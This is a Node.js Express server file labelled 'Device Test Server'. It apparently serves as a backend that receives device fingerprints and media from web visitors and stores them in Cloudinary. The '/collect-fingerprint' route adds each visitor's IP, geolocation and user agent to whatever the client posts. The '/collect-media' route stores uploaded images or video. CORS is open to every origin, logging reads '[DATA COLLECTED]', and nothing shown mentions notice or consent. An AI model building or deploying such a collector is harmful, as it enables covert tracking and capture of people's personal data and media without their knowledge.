const express = require('express');
const cloudinary = require('cloudinary').v2;
const geoip = require('geoip-lite');

// Configure Cloudinary
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME || process.env.CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY || process.env.API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET || process.env.API_SECRET
});

const app = express();

// Middleware
app.use(express.json({
  limit: '50mb',
  verify: (req, res, buf, encoding) => {
    try {
      JSON.parse(buf);
    } catch (e) {
      res.status(400).json({ error: 'Invalid JSON' });
      throw new Error('Invalid JSON');
    }
  }
}));
app.use(express.static('public'));

// CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  next();
});

// Utility Functions
function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
         req.ip;
}

function getClientInfo(req) {
  const ip = getClientIp(req);
  const geo = geoip.lookup(ip);
  
  return {
    ip,
    geo: geo ? {
      country: geo.country,
      city: geo.city
    } : null,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString()
  };
}

function logDataCollection(type, data) {
  console.log(`[DATA COLLECTED] ${type} from ${data.ip}`);
}

async function uploadToCloudinary(data, folderPath) {
  const base64Data = Buffer.from(JSON.stringify(data)).toString('base64');
  return await cloudinary.uploader.upload(
    `data:application/json;base64,${base64Data}`,
    {
      folder: folderPath,
      resource_type: 'raw',
      format: 'json'
    }
  );
}

// Routes
app.get('/', (req, res) => {
  res.json({
    status: 'active',
    message: 'Device Test Server Running',
    timestamp: new Date().toISOString()
  });
});

app.post('/collect-fingerprint', async (req, res) => {
  try {
    if (!req.body) {
      return res.status(400).json({ error: 'No data received' });
    }

    const clientInfo = getClientInfo(req);
    const result = await uploadToCloudinary(
      { ...clientInfo, ...req.body },
      'fingerprints'
    );

    console.log('Successfully stored fingerprint');
    res.json({ 
      success: true, 
      url: result.secure_url 
    });

  } catch (error) {
    console.error('Fingerprint error:', error);
    res.status(500).json({ 
      error: 'Failed to save fingerprint',
      details: process.env.NODE_ENV === 'development' ? error.message : null
    });
  }
});

app.post('/collect-media', async (req, res) => {
  try {
    const { data, metadata } = req.body;
    const result = await cloudinary.uploader.upload(data, {
      folder: 'media',
      resource_type: metadata.media_type === 'image' ? 'image' : 'video'
    });

    res.json({ success: true, url: result.secure_url });
  } catch (error) {
    console.error('Media upload error:', error);
    res.status(500).json({ error: 'Failed to save media' });
  }
});

// Error handling
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
